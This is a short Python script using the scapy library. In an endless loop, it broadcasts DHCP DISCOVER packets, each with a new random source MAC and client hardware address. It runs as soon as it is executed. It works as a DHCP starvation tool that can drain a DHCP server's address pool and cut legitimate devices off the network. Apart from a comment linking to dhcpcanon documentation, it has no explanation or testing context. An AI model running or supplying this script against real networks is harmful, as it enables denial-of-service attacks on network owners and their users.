# Please read: https://dhcpcanon.readthedocs.io/en/latest/implementation.html

from scapy.all import Ether, RandMAC, IP, UDP, BOOTP, DHCP, sendp

def generate_unicast_mac():
    mac = RandMAC()._fix()  # Generate a random MAC address and convert it to a string
    mac_bytes = bytes.fromhex(mac.replace(':', ''))
    mac_bytes = bytearray(mac_bytes)
    mac_bytes[0] &= 0xFE  # Ensure it's a unicast MAC by clearing the multicast bit
    return ':'.join(format(x, '02x') for x in mac_bytes)

def generate_and_send_DHCP_discovery():
    ip_packet = IP(src = "0.0.0.0", dst = "255.255.255.255")
    udp_packet = UDP(sport = 68, dport = 67)
    dhcp_packet = DHCP(options = [('message-type', 'discover'), ('end')])
    while True:
        msrc = generate_unicast_mac()
        ethernet_frame = Ether(src = msrc, dst = "ff:ff:ff:ff:ff:ff")
        bootp_packet = BOOTP(chaddr=RandMAC())
        to_send = ethernet_frame/ ip_packet/ udp_packet/ bootp_packet/ dhcp_packet
        sendp(to_send)

generate_and_send_DHCP_discovery()
